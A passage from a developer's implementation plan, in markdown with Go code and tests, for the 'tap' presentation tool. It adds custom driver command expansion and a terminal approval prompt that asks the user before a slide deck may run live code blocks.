func TestBuildDriverRegistryKeepsTheBuiltInShell(t *testing.T) {
	t.Setenv("TAP_TEST_UNSET_SHELL", "")
	os.Unsetenv("TAP_TEST_UNSET_SHELL")
	cfg := &config.Config{Drivers: map[string]config.DriverConfig{
		"shell": {Command: "${TAP_TEST_UNSET_SHELL}"},
	}}
	registry := buildDriverRegistry(cfg, t.TempDir())
	result := registry.Execute(context.Background(), "shell", "echo built in", map[string]string{})
	if !result.Success || !strings.Contains(result.Output, "built in") {
		t.Errorf("shell = %+v, want the built-in shell driver", result)
	}
}
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/cli -run 'TestBuildDriverRegistry' -short`
Expected: the first test FAILS with command `${TAP_TEST_INTERPRETER}`, the second with `driver not found` or a failed exec.

- [ ] **Step 3: Change `internal/cli/drivers.go`**

Replace the custom driver loop in `buildDriverRegistry` with:

```go
	custom := make(map[string]driver.DriverConfigInput, len(cfg.Drivers))
	for name, settings := range cfg.Drivers {
		// A drivers: entry with a built-in name configures that driver
		// and runs no command of its own.
		if registry.Has(name) || settings.Command == "" {
			continue
		}
		command, args, err := settings.ExpandedCommand(name, os.LookupEnv)
		if err != nil {
			registry.Register(unavailableDriver{name: name, err: err})
			continue
		}
		custom[name] = driver.DriverConfigInput{
			Args:       args,
			Command:    command,
			WorkingDir: baseDir,
			Timeout:    settings.Timeout,
		}
	}
	driver.RegisterCustomDrivers(registry, custom)
	return registry
```

Change the function comment's last sentence to: "Every driver runs in the deck's folder. A custom command's ${NAME} expands here, so a reload picks up a changed .env."

Add below the function:

```go
// builtInDriverNames are the drivers tap ships. A drivers: entry with one
// of these names configures the built-in driver.
var builtInDriverNames = []string{"mysql", "postgres", "shell", "sqlite"}

// unavailableDriver stands in for a custom driver whose settings cannot be
// used, such as a command that names an unset variable. Every block that
// uses it fails with that reason.
type unavailableDriver struct {
	err  error
	name string
}

func (d unavailableDriver) Name() string { return d.name }

func (d unavailableDriver) Execute(context.Context, string, map[string]string) driver.Result {
	return driver.Result{Success: false, Error: d.err.Error()}
}
```

Add `"context"` and `"os"` to the imports.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `go test ./internal/cli -run 'TestBuildDriverRegistry' -short -v`
Expected: PASS, including P1's three registry tests.

- [ ] **Step 5: Commit**

```bash
git add internal/cli/drivers.go internal/cli/drivers_test.go
git commit -m "feat(dev): expand \${NAME} in custom driver commands"
```

---

### Task 7: The approval check and the terminal prompt

**Files:**
- Create: `internal/cli/approval.go`
- Create: `internal/cli/approval_test.go`
- Create: `internal/cli/main_test.go`

**Interfaces:**
- Consumes: `usersettings` approvals (Task 1); `Config.DeclaredDrivers` and `TransformedCodeBlock.Block`/`.Problem` (Task 3); `server.LiveCodePolicy` (Task 4); `builtInDriverNames` (Task 6)
- Produces (P6 builds on these):
  - `type approvalRequest struct { Deck string; Drivers []approvalDriver; ApprovedBefore []string; Blocks []approvalBlock }`, JSON names `deck`, `drivers`, `approvedBefore`, `blocks`. P6 sends it as the `payload` of an `approval` question.
  - `type approvalDriver struct { Name, Command string; Slides []int; Blocks int }`, JSON `name`, `command`, `slides`, `blocks`
  - `type approvalBlock struct { Driver, Code string; Slide, Block int }`, JSON `driver`, `code`, `slide`, `block`
  - `type approvalAsker interface { askApproval(request approvalRequest) (bool, error) }`
  - `type approvalInput struct { Now func() time.Time; Config *config.Config; Presentation *transformer.TransformedPresentation; Asker approvalAsker; Out io.Writer; SettingsPath, Deck string; AllowCode, Interactive bool }`
  - `func liveCodeApproval(input approvalInput) (server.LiveCodePolicy, error)`: the one approval function. P6 calls it with `Interactive: true` and its own asker.
  - `type terminalAsker struct { in io.Reader; out io.Writer }`
  - `TestMain` in `internal/cli`: every test in the package uses a temporary `XDG_CONFIG_HOME`.

- [ ] **Step 1: Write `internal/cli/main_test.go`**

`tap new` writes an approval from Task 10 on, and many tests call it. None of them may touch the real settings file.

```go
package cli

import (
	"fmt"
	"os"
	"testing"
)

// TestMain points the user settings at a temporary folder, so no test
// reads or writes the settings.yaml of the person running the tests.
// Subprocesses inherit it through os.Environ.
func TestMain(m *testing.M) {
	configHome, err := os.MkdirTemp("", "tap-cli-test-config-*")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	if err := os.Setenv("XDG_CONFIG_HOME", configHome); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	code := m.Run()
	_ = os.RemoveAll(configHome)
	os.Exit(code)
}
```

- [ ] **Step 2: Write the failing tests**

`internal/cli/approval_test.go`:

```go
package cli

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MiniCodeMonkey/tap/internal/config"
	"github.com/MiniCodeMonkey/tap/internal/parser"
	"github.com/MiniCodeMonkey/tap/internal/transformer"
	"github.com/MiniCodeMonkey/tap/internal/usersettings"
)

// fakeAsker answers every approval request with answer, and keeps them.
type fakeAsker struct {
	requests []approvalRequest
	answer   bool
}

func (asker *fakeAsker) askApproval(request approvalRequest) (bool, error) {
	asker.requests = append(asker.requests, request)
	return asker.answer, nil
}

// approvalFixture returns a deck with shell blocks on slides 1 and 2 and a
// python block on slide 3, declaring the drivers in declared. python is a
// custom driver that runs "python3 -c".
func approvalFixture(declared ...string) (*config.Config, *transformer.TransformedPresentation) {
	cfg := config.DefaultConfig()
	for _, name := range declared {
		settings := config.DriverConfig{}
		if name == "python" {
			settings = config.DriverConfig{Command: "python3", Args: []string{"-c"}}
		}
		cfg.Drivers[name] = settings
	}
	parsed := &parser.Presentation{Slides: []parser.Slide{
		{Index: 0, CodeBlocks: []parser.CodeBlock{{Language: "bash", Code: "echo one", Meta: parser.CodeBlockMeta{Driver: "shell"}}}},
		{Index: 1, CodeBlocks: []parser.CodeBlock{{Language: "bash", Code: "echo two\necho three", Meta: parser.CodeBlockMeta{Driver: "shell"}}}},
		{Index: 2, CodeBlocks: []parser.CodeBlock{{Language: "python", Code: "print(3)", Meta: parser.CodeBlockMeta{Driver: "python"}}}},
	}}
	return cfg, transformer.New(cfg).Transform(parsed)
}

var approvalNow = time.Date(2026, 9, 22, 19, 32, 0, 0, time.UTC)

func approvalInputFor(t *testing.T, cfg *config.Config, pres *transformer.TransformedPresentation, asker approvalAsker) (approvalInput, *bytes.Buffer) {
	t.Helper()
	out := &bytes.Buffer{}
	return approvalInput{
		Now:          func() time.Time { return approvalNow },
		Config:       cfg,
		Presentation: pres,
		Asker:        asker,
		Out:          out,
		SettingsPath: filepath.Join(t.TempDir(), "settings.yaml"),
		Deck:         "/talks/talk.md",
		Interactive:  true,
	}, out
}

func TestApprovalAsksOnceAndRemembersTheAnswer(t *testing.T) {
	cfg, pres := approvalFixture("python", "shell")
	asker := &fakeAsker{answer: true}
	input, _ := approvalInputFor(t, cfg, pres, asker)

	policy, err := liveCodeApproval(input)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(policy.Drivers, ",") != "python,shell" || policy.AllowAll {
		t.Errorf("policy = %+v, want python and shell", policy)
	}
	settings, _ := usersettings.Load(input.SettingsPath)
	if !settings.Approved("/talks/talk.md", []string{"python", "shell"}) {
		t.Errorf("the approval was not saved: %+v", settings)
	}

	if _, err := liveCodeApproval(input); err != nil {
		t.Fatal(err)
	}
	if len(asker.requests) != 1 {
		t.Errorf("asked %d times, want once", len(asker.requests))
	}
}

func TestApprovalRequestListsDriversBlocksAndCommands(t *testing.T) {
	cfg, pres := approvalFixture("python", "shell")
	asker := &fakeAsker{}
	input, _ := approvalInputFor(t, cfg, pres, asker)
	if _, err := liveCodeApproval(input); err != nil {
		t.Fatal(err)
	}

	request := asker.requests[0]
	if request.Deck != "/talks/talk.md" || len(request.ApprovedBefore) != 0 {
		t.Errorf("request = %+v", request)
	}
	if len(request.Drivers) != 2 {
		t.Fatalf("drivers = %+v, want python and shell", request.Drivers)
	}
	python, shell := request.Drivers[0], request.Drivers[1]
	if python.Name != "python" || python.Command != "python3 -c" || python.Blocks != 1 {
		t.Errorf("python = %+v", python)
	}
	if shell.Name != "shell" || shell.Command != "" || shell.Blocks != 2 || len(shell.Slides) != 2 {
		t.Errorf("shell = %+v, want 2 blocks on 2 slides and no command", shell)
	}
	if len(request.Blocks) != 3 || request.Blocks[0].Slide != 1 || request.Blocks[2].Slide != 3 {
		t.Errorf("blocks = %+v, want three in slide order", request.Blocks)
	}
}

func TestApprovalDeclineStoresNothingAndAsksAgain(t *testing.T) {
	cfg, pres := approvalFixture("shell")
	asker := &fakeAsker{answer: false}
	input, out := approvalInputFor(t, cfg, pres, asker)

	policy, err := liveCodeApproval(input)
	if err != nil {
		t.Fatal(err)
	}
	if len(policy.Drivers) != 0 || policy.AllowAll {
		t.Errorf("policy = %+v, want nothing allowed", policy)
	}
	if !strings.Contains(out.String(), "Live code is off for shell in this run. tap asks again next time.") {
		t.Errorf("output = %q", out.String())
	}
	if _, err := os.Stat(input.SettingsPath); !os.IsNotExist(err) {
		t.Errorf("a no saved the settings file (stat error %v)", err)
	}

	if _, err := liveCodeApproval(input); err != nil {
		t.Fatal(err)
	}
	if len(asker.requests) != 2 {
		t.Errorf("asked %d times, want again on the next start", len(asker.requests))
	}
}

func TestApprovalAsksOnlyAboutANewDriver(t *testing.T) {
	cfg, pres := approvalFixture("python", "shell")
	asker := &fakeAsker{answer: false}
	input, _ := approvalInputFor(t, cfg, pres, asker)
	var settings usersettings.Settings
	settings.Approve("/talks/talk.md", []string{"shell"}, approvalNow)
	if err := usersettings.Save(input.SettingsPath, settings); err != nil {
		t.Fatal(err)
	}

	policy, err := liveCodeApproval(input)
	if err != nil {
		t.Fatal(err)
	}
	request := asker.requests[0]
	if len(request.Drivers) != 1 || request.Drivers[0].Name != "python" {
		t.Errorf("drivers = %+v, want only the new python driver", request.Drivers)
	}
	if strings.Join(request.ApprovedBefore, ",") != "shell" {
		t.Errorf("approvedBefore = %v, want shell", request.ApprovedBefore)
	}
	if len(request.Blocks) != 1 || request.Blocks[0].Driver != "python" {
		t.Errorf("blocks = %+v, want only the python block", request.Blocks)
	}
	if strings.Join(policy.Drivers, ",") != "shell" {
		t.Errorf("policy = %+v, want shell still allowed after a no to python", policy)
	}

	asker.answer = true
	if _, err := liveCodeApproval(input); err != nil {
		t.Fatal(err)
	}
	saved, _ := usersettings.Load(input.SettingsPath)
	approval, _ := saved.ApprovalFor("/talks/talk.md")
	if strings.Join(approval.Drivers, ",") != "python,shell" {
		t.Errorf("approved drivers = %v, want python and shell", approval.Drivers)
	}
}

func TestApprovalAsksAgainForAMovedDeck(t *testing.T) {
	cfg, pres := approvalFixture("shell")
	asker := &fakeAsker{answer: true}
	input, _ := approvalInputFor(t, cfg, pres, asker)
	var settings usersettings.Settings
	settings.Approve("/old/place/talk.md", []string{"shell"}, approvalNow)
	if err := usersettings.Save(input.SettingsPath, settings); err != nil {
		t.Fatal(err)
	}

	if _, err := liveCodeApproval(input); err != nil {
		t.Fatal(err)
	}
	if len(asker.requests) != 1 {
		t.Errorf("asked %d times, want once for the deck at its new path", len(asker.requests))
	}
}

func TestApprovalAllowCodeAsksNothingAndStoresNothing(t *testing.T) {
	cfg, pres := approvalFixture("shell")
	asker := &fakeAsker{}
	input, out := approvalInputFor(t, cfg, pres, asker)
	input.AllowCode = true
	input.Interactive = false

	policy, err := liveCodeApproval(input)
	if err != nil || !policy.AllowAll {
		t.Errorf("policy = %+v, %v; want AllowAll", policy, err)
	}
	if len(asker.requests) != 0 {
		t.Error("--allow-code asked")
	}
	if _, err := os.Stat(input.SettingsPath); !os.IsNotExist(err) {
		t.Error("--allow-code saved the settings file")
	}
	if !strings.Contains(out.String(), "--allow-code") {
		t.Errorf("output = %q, want a note that --allow-code is on", out.String())
	}
}

func TestApprovalNeverAsksWithoutATerminal(t *testing.T) {
	cfg, pres := approvalFixture("shell")
	asker := &fakeAsker{answer: true}
	input, out := approvalInputFor(t, cfg, pres, asker)
	input.Interactive = false

	policy, err := liveCodeApproval(input)
	if err != nil || len(policy.Drivers) != 0 {
		t.Errorf("policy = %+v, %v; want nothing allowed", policy, err)
	}
	if len(asker.requests) != 0 {
		t.Error("asked without a terminal")
	}
	if !strings.Contains(out.String(), "Live code is off: this deck is not approved to run shell.") {
		t.Errorf("output = %q", out.String())
	}

	var settings usersettings.Settings
	settings.Approve("/talks/talk.md", []string{"shell"}, approvalNow)
	if err := usersettings.Save(input.SettingsPath, settings); err != nil {
		t.Fatal(err)
	}
	policy, err = liveCodeApproval(input)
	if err != nil || strings.Join(policy.Drivers, ",") != "shell" {
		t.Errorf("an approved deck without a terminal: policy = %+v, %v; want shell", policy, err)
	}
}

func TestApprovalIsNotNeededWithoutRunnableCode(t *testing.T) {
	asker := &fakeAsker{answer: true}

	cfg := config.DefaultConfig()
	cfg.Drivers["shell"] = config.DriverConfig{}
	noLiveCode := transformer.New(cfg).Transform(&parser.Presentation{Slides: []parser.Slide{
		{Index: 0, CodeBlocks: []parser.CodeBlock{{Language: "go", Code: "package main"}}},
	}})
	input, out := approvalInputFor(t, cfg, noLiveCode, asker)
	if policy, err := liveCodeApproval(input); err != nil || len(policy.Drivers) != 0 {
		t.Errorf("policy = %+v, %v", policy, err)
	}

	undeclaredCfg, undeclaredOnly := approvalFixture()
	input, _ = approvalInputFor(t, undeclaredCfg, undeclaredOnly, asker)
	if _, err := liveCodeApproval(input); err != nil {
		t.Fatal(err)
	}

	if len(asker.requests) != 0 || out.Len() != 0 {
		t.Errorf("asked %d times, printed %q; want nothing", len(asker.requests), out.String())
	}
}

func TestApprovalIgnoresAnUnreadableSettingsFile(t *testing.T) {
	cfg, pres := approvalFixture("shell")
	asker := &fakeAsker{answer: true}
	input, out := approvalInputFor(t, cfg, pres, asker)
	if err := os.WriteFile(input.SettingsPath, []byte("approvals: [not: valid"), 0o600); err != nil {
		t.Fatal(err)
	}

	policy, err := liveCodeApproval(input)
	if err != nil || strings.Join(policy.Drivers, ",") != "shell" {
		t.Errorf("policy = %+v, %v", policy, err)
	}
	if !strings.Contains(out.String(), "Ignoring") {
		t.Errorf("output = %q, want the unreadable file named", out.String())
	}
}

func terminalRequest() approvalRequest {
	return approvalRequest{
		Deck: "/talks/talk.md",
		Drivers: []approvalDriver{
			{Name: "python", Command: "python3 -c", Slides: []int{3}, Blocks: 1},
			{Name: "shell", Slides: []int{1, 2}, Blocks: 2},
		},
		Blocks: []approvalBlock{
			{Driver: "shell", Code: "echo one", Slide: 1, Block: 1},
			{Driver: "shell", Code: "echo two\necho three", Slide: 2, Block: 1},
			{Driver: "python", Code: "print(3)", Slide: 3, Block: 1},
		},
	}
}

func TestTerminalAskerListsTheDriversAndShowsTheCode(t *testing.T) {
	out := &bytes.Buffer{}
	approved, err := terminalAsker{in: strings.NewReader("s\ny\n"), out: out}.askApproval(terminalRequest())
	if err != nil || !approved {
		t.Fatalf("approved = %v, %v; want true", approved, err)
	}
	text := out.String()
	for _, want := range []string{
		"This deck can run code on this computer:\n  /talks/talk.md\n",
		"  python     1 block on slide 3, runs: python3 -c\n",
		"  shell      2 blocks on slides 1, 2\n",
		"Slide 2, block 1 (shell):\n    echo two\n    echo three\n",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("output lacks %q:\n%s", want, text)
		}
	}
	if strings.Count(text, "[y/N/s]") != 2 {
		t.Errorf("want the question again after showing the code:\n%s", text)
	}
}

func TestTerminalAskerDefaultsToNo(t *testing.T) {
	for _, typed := range []string{"\n", "", "n\n", "no\n", "maybe\n"} {
		approved, err := terminalAsker{in: strings.NewReader(typed), out: &bytes.Buffer{}}.askApproval(terminalRequest())
		if err != nil || approved {
			t.Errorf("typed %q: approved = %v, %v; want false", typed, approved, err)
		}
	}
}

func TestTerminalAskerAsksAgainAfterAnUnclearAnswer(t *testing.T) {
	out := &bytes.Buffer{}
	approved, _ := terminalAsker{in: strings.NewReader("maybe\ny\n"), out: out}.askApproval(terminalRequest())
	if !approved || strings.Count(out.String(), "[y/N/s]") != 2 {
		t.Errorf("approved = %v, output:\n%s", approved, out.String())
	}
}

func TestTerminalAskerNamesOnlyTheNewDriver(t *testing.T) {
	request := approvalRequest{
		Deck:           "/talks/talk.md",
		Drivers:        []approvalDriver{{Name: "shell", Slides: []int{6}, Blocks: 1}},
		ApprovedBefore: []string{"sqlite"},
		Blocks:         []approvalBlock{{Driver: "shell", Code: "ls", Slide: 6, Block: 1}},
	}
	out := &bytes.Buffer{}
	_, _ = terminalAsker{in: strings.NewReader("n\n"), out: out}.askApproval(request)
	if !strings.Contains(out.String(), "This deck now also wants to run shell:\n") {
		t.Errorf("output:\n%s", out.String())
	}
	if !strings.Contains(out.String(), "Already approved: sqlite") {
		t.Errorf("output does not name the drivers approved before:\n%s", out.String())
	}
}
```

- [ ] **Step 3: Run the tests to verify they fail**

Run: `go test ./internal/cli -run 'TestApproval|TestTerminalAsker' -short`
Expected: compile failure, `undefined: approvalRequest`.

- [ ] **Step 4: Write `internal/cli/approval.go`**

```go
package cli

import (
	"bufio"
	"fmt"
	"io"
	"slices"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/MiniCodeMonkey/tap/internal/config"
	"github.com/MiniCodeMonkey/tap/internal/server"
	"github.com/MiniCodeMonkey/tap/internal/transformer"
	"github.com/MiniCodeMonkey/tap/internal/usersettings"
)

// approvalRequest is the question tap asks before a deck may run live
// code. It encodes to JSON, so a caller other than the terminal can show
// it.
//
//nolint:govet // fieldalignment: field order is the JSON output order
type approvalRequest struct {
	Deck string `json:"deck"`
	// Drivers are the drivers a yes approves: every declared driver, or
	// only the new ones when the deck was approved before.
	Drivers []approvalDriver `json:"drivers"`
	// ApprovedBefore are the drivers an earlier answer approved.
	ApprovedBefore []string `json:"approvedBefore,omitempty"`
	// Blocks are the live code blocks that use Drivers, in slide order.
	Blocks []approvalBlock `json:"blocks"`
}

// approvalDriver is one driver in an approval request.
//
//nolint:govet // fieldalignment: field order is the JSON output order
type approvalDriver struct {
	Name string `json:"name"`
	// Command is what a custom driver runs, with its arguments, as the
	// frontmatter writes it. Empty for a built-in driver.
	Command string `json:"command,omitempty"`
	// Slides are the numbers of the slides with a block that uses it.
	Slides []int `json:"slides"`
	Blocks int   `json:"blocks"`
}

// approvalBlock is one live code block in an approval request.
//
//nolint:govet // fieldalignment: field order is the JSON output order
type approvalBlock struct {
	Driver string `json:"driver"`
	Code   string `json:"code"`
	Slide  int    `json:"slide"`
	Block  int    `json:"block"`
}

// approvalAsker puts an approval request to the person and returns the
// answer. The terminal asks on standard input. tap dev --app sends the
// request as a question event and reads the answer from standard input.
// Never the slide page, where page script could answer.
type approvalAsker interface {
	askApproval(request approvalRequest) (bool, error)
}

// approvalInput is everything the approval check reads.
type approvalInput struct {
	Now          func() time.Time
	Config       *config.Config
	Presentation *transformer.TransformedPresentation
	Asker        approvalAsker
	Out          io.Writer
	SettingsPath string
	// Deck is the deck's absolute path, which approvals are keyed by.
	Deck string
	// AllowCode is --allow-code: live code runs for this run, and nothing
	// is asked or stored.
	AllowCode bool
	// Interactive is true when tap may ask: a terminal on standard input
	// and no --headless.
	Interactive bool
}

// liveCodeApproval decides which drivers this run of tap dev or tap
// present may run. A deck needs approval when a live code block uses a
// declared driver. An approved deck runs. Otherwise tap asks, when it may,
// and a yes is stored in the user settings. A no, or a run that may not
// ask, stores nothing and keeps the drivers approved before.
func liveCodeApproval(input approvalInput) (server.LiveCodePolicy, error) {
	blocks := runnableBlocks(input.Presentation)
	if len(blocks) == 0 {
		return server.LiveCodePolicy{}, nil
	}
	if input.AllowCode {
		fmt.Fprintln(input.Out, "Live code is on for this run (--allow-code). No approval is saved.")
		return server.LiveCodePolicy{AllowAll: true}, nil
	}

	declared := input.Config.DeclaredDrivers()
	settings, err := usersettings.Load(input.SettingsPath)
	if err != nil {
		// A malformed settings file must not stop the talk. A yes below
		// overwrites it with a well-formed one.
		fmt.Fprintf(input.Out, "Ignoring %s, it could not be read: %v\n", input.SettingsPath, err)
		settings = usersettings.Settings{}
	}
	if settings.Approved(input.Deck, declared) {
		return server.LiveCodePolicy{Drivers: declared}, nil
	}

	previous, _ := settings.ApprovalFor(input.Deck)
	var approvedBefore, wanted []string
	for _, name := range declared {
		if slices.Contains(previous.Drivers, name) {
			approvedBefore = append(approvedBefore, name)
		} else {
			wanted = append(wanted, name)
		}
	}

	if !input.Interactive {
		fmt.Fprintf(input.Out, "Live code is off: this deck is not approved to run %s. Run tap dev or tap present in a terminal to approve it, or pass --allow-code for this run.\n", joinWithAnd(wanted))
		return server.LiveCodePolicy{Drivers: approvedBefore}, nil
	}

	approved, err := input.Asker.askApproval(newApprovalRequest(input.Deck, input.Config, blocks, wanted, approvedBefore))
	if err != nil || !approved {
		fmt.Fprintf(input.Out, "Live code is off for %s in this run. tap asks again next time.\n", joinWithAnd(wanted))
		return server.LiveCodePolicy{Drivers: approvedBefore}, nil
	}

	settings.Approve(input.Deck, declared, input.Now())
	if err := usersettings.Save(input.SettingsPath, settings); err != nil {
		return server.LiveCodePolicy{}, fmt.Errorf("saving the live code approval: %w", err)
	}
	return server.LiveCodePolicy{Drivers: declared}, nil
}

// runnableBlocks returns the live code blocks that use a declared driver,
// in slide order.
func runnableBlocks(presentation *transformer.TransformedPresentation) []approvalBlock {
	var blocks []approvalBlock
	for _, slide := range presentation.Slides {
		for _, block := range slide.CodeBlocks {
			if block.Block == 0 || block.Problem != "" {
				continue
			}
			blocks = append(blocks, approvalBlock{Driver: block.Driver, Code: block.Code, Slide: slide.Index + 1, Block: block.Block})
		}
	}
	return blocks
}

// newApprovalRequest builds the question for the drivers in wanted.
func newApprovalRequest(deck string, cfg *config.Config, blocks []approvalBlock, wanted, approvedBefore []string) approvalRequest {
	request := approvalRequest{Deck: deck, ApprovedBefore: approvedBefore, Blocks: []approvalBlock{}}
	for _, name := range wanted {
		entry := approvalDriver{Name: name, Slides: []int{}}
		if settings := cfg.Drivers[name]; settings.Command != "" && !slices.Contains(builtInDriverNames, name) {
			entry.Command = strings.Join(append([]string{settings.Command}, settings.Args...), " ")
		}
		for _, block := range blocks {
			if block.Driver != name {
				continue
			}
			entry.Blocks++
			if !slices.Contains(entry.Slides, block.Slide) {
				entry.Slides = append(entry.Slides, block.Slide)
			}
			request.Blocks = append(request.Blocks, block)
		}
		request.Drivers = append(request.Drivers, entry)
	}
	sort.SliceStable(request.Blocks, func(i, j int) bool {
		if request.Blocks[i].Slide != request.Blocks[j].Slide {
			return request.Blocks[i].Slide < request.Blocks[j].Slide
		}
		return request.Blocks[i].Block < request.Blocks[j].Block
	})
	return request
}

// terminalAsker asks on the terminal, before the TUI starts.
type terminalAsker struct {
	in  io.Reader
	out io.Writer
}

// askApproval prints the request and reads y, n, or s to show the code
// first. An empty answer, or the end of input, is no.
func (asker terminalAsker) askApproval(request approvalRequest) (bool, error) {
	printApprovalRequest(asker.out, request)
	reader := bufio.NewReader(asker.in)
	for {
		fmt.Fprint(asker.out, "Allow this deck to run code? Type s to show the code. [y/N/s] ")
		line, readErr := reader.ReadString('\n')
		switch strings.ToLower(strings.TrimSpace(line)) {
		case "y", "yes":
			return true, nil
		case "", "n", "no":
			return false, nil
		case "s", "show":
			printApprovalBlocks(asker.out, request.Blocks)
		}
		if readErr != nil {
			return false, nil
		}
	}
}

// printApprovalRequest prints the deck and one line per driver.
func printApprovalRequest(out io.Writer, request approvalRequest) {
	names := make([]string, len(request.Drivers))
	for index, entry := range request.Drivers {
		names[index] = entry.Name
	}
	fmt.Fprintln(out)
	if len(request.ApprovedBefore) > 0 {
		fmt.Fprintf(out, "This deck now also wants to run %s:\n", joinWithAnd(names))
	} else {
		fmt.Fprintln(out, "This deck can run code on this computer:")
	}
	fmt.Fprintf(out, "  %s\n\n", request.Deck)
	for _, entry := range request.Drivers {
		line := fmt.Sprintf("  %-10s %s", entry.Name, describeDriverBlocks(entry))
		if entry.Command != "" {
			line += ", runs: " + entry.Command
		}
		fmt.Fprintln(out, line)
	}
	if len(request.ApprovedBefore) > 0 {
		fmt.Fprintf(out, "\n  Already approved: %s\n", strings.Join(request.ApprovedBefore, ", "))
	}
	fmt.Fprintln(out)
}

// describeDriverBlocks says how many blocks use a driver, and on which
// slides.
func describeDriverBlocks(entry approvalDriver) string {
	if entry.Blocks == 0 {
		return "no blocks yet"
	}
	blockWord := "blocks"
	if entry.Blocks == 1 {
		blockWord = "block"
	}
	slideWord := "slides"
	if len(entry.Slides) == 1 {
		slideWord = "slide"
	}
	numbers := make([]string, len(entry.Slides))
	for index, slide := range entry.Slides {
		numbers[index] = strconv.Itoa(slide)
	}
	return fmt.Sprintf("%d %s on %s %s", entry.Blocks, blockWord, slideWord, strings.Join(numbers, ", "))
}

// printApprovalBlocks prints the code of every block in the request.
func printApprovalBlocks(out io.Writer, blocks []approvalBlock) {
	for _, block := range blocks {
		fmt.Fprintf(out, "\nSlide %d, block %d (%s):\n", block.Slide, block.Block, block.Driver)
		for _, line := range strings.Split(block.Code, "\n") {
			fmt.Fprintf(out, "    %s\n", line)
		}
	}
	fmt.Fprintln(out)
}

// joinWithAnd joins names as "a", "a and b", or "a, b and c".
func joinWithAnd(names []string) string {
	switch len(names) {
	case 0:
		return ""
	case 1:
		return names[0]
	}
	return strings.Join(names[:len(names)-1], ", ") + " and " + names[len(names)-1]
}
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `go test ./internal/cli -run 'TestApproval|TestTerminalAsker|TestConsent' -short -v`
Expected: PASS.

Run: `go vet ./internal/cli`
Expected: no output.

- [ ] **Step 6: Commit**

```bash
git add internal/cli/approval.go internal/cli/approval_test.go internal/cli/main_test.go
git commit -m "feat(cli): ask before a deck runs live code, and remember the answer"
```

---

### Task 8: Wire approvals into `tap dev` and `tap present`

**Files:**
- Create: `internal/cli/live_code_warnings.go`
- Create: `internal/cli/live_code_warnings_test.go`
- Modify: `internal/cli/dev.go`
- Modify: `internal/cli/present.go`
- Modify: `internal/cli/root_test.go`
- Modify: `internal/cli/live_code_test.go`

**Interfaces:**
- Consumes: `liveCodeApproval`, `terminalAsker` (Task 7); `server.SetLiveCodePolicy` (Task 4); `slidelist.Build` (P3); P1's `serverOptions`, `stdinIsTerminal`, `freePort`, `buildTapBinaryForTest`
- Produces:
  - `serverOptions.allowCode bool`; `--allow-code` on `tap dev` and `tap present`
  - `func undeclaredDriverWarnings(file string, pres *transformer.TransformedPresentation) []string`: one line per blocked block, `warning: <file>:<line>: <message>`, or `warning: <file>: slide <n>: <message>` when the line is not known
  - `type liveBlockReference struct { slide, block int }` and `func liveBlockLines(file string) map[liveBlockReference]int`

- [ ] **Step 1: Write the failing tests**

`internal/cli/live_code_warnings_test.go`:

```go
package cli

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/MiniCodeMonkey/tap/internal/config"
)

func loadDeckForTest(t *testing.T, content string) string {
	t.Helper()
	deckPath := filepath.Join(t.TempDir(), "deck.md")
	if err := os.WriteFile(deckPath, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return deckPath
}

func TestUndeclaredDriverWarningsNameTheFileAndLine(t *testing.T) {
	deckPath := loadDeckForTest(t, "---\ntitle: Query\n---\n\n# Query\n\n```sql {driver: sqlite}\nSELECT 1;\n```\n")
	cfg, err := config.Load(deckPath)
	if err != nil {
		t.Fatal(err)
	}
	pres, _, _, _, _, err := loadPresentation(deckPath, cfg, filepath.Dir(deckPath))
	if err != nil {
		t.Fatal(err)
	}

	got := undeclaredDriverWarnings(deckPath, pres)
	want := fmt.Sprintf("warning: %s:7: This deck does not declare the sqlite driver. Add this to the frontmatter:\n\ndrivers:\n  sqlite: {}", deckPath)
	if len(got) != 1 || got[0] != want {
		t.Errorf("warnings = %q, want [%q]", got, want)
	}
}

func TestUndeclaredDriverWarningsAreEmptyWhenEveryDriverIsDeclared(t *testing.T) {
	deckPath := loadDeckForTest(t, "---\ndrivers:\n  sqlite: {}\n---\n\n# Query\n\n```sql {driver: sqlite}\nSELECT 1;\n```\n")
	cfg, _ := config.Load(deckPath)
	pres, _, _, _, _, err := loadPresentation(deckPath, cfg, filepath.Dir(deckPath))
	if err != nil {
		t.Fatal(err)
	}
	if got := undeclaredDriverWarnings(deckPath, pres); len(got) != 0 {
		t.Errorf("warnings = %q, want none", got)
	}
}
```

In `internal/cli/root_test.go`, add `"allow-code"` to the flags `TestPresentCommandIsRegistered` expects, and add:

```go
func TestDevHasTheAllowCodeFlag(t *testing.T) {
	command, _, err := rootCmd.Find([]string{"dev"})
	if err != nil {
		t.Fatal(err)
	}
	if command.Flags().Lookup("allow-code") == nil {
		t.Error("dev lacks --allow-code")
	}
}
```

Replace the contents of `internal/cli/live_code_test.go` (P1's version, with the Task 4 skip) with:

```go
package cli

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/MiniCodeMonkey/tap/internal/usersettings"
)

const liveCodeDeck = "---\ntitle: Live code\ndrivers:\n  shell: {}\n---\n\n# Run it\n\n```bash {driver: 'shell'}\necho hello from tap\n```\n"

func writeLiveCodeDeck(t *testing.T) string {
	t.Helper()
	deckPath := filepath.Join(t.TempDir(), "live.md")
	if err := os.WriteFile(deckPath, []byte(liveCodeDeck), 0o644); err != nil {
		t.Fatal(err)
	}
	return deckPath
}

// startDevForLiveCode starts a real tap dev --headless on deckPath with its
// own settings folder and extra arguments, waits until it serves the deck,
// and returns its base URL. It stops tap dev when the test ends.
func startDevForLiveCode(t *testing.T, deckPath, configHome string, extra ...string) string {
	t.Helper()
	binary := buildTapBinaryForTest(t)
	port := freePort(t)
	args := append([]string{"dev", deckPath, "--headless", "--port", fmt.Sprint(port)}, extra...)
	command := exec.Command(binary, args...)
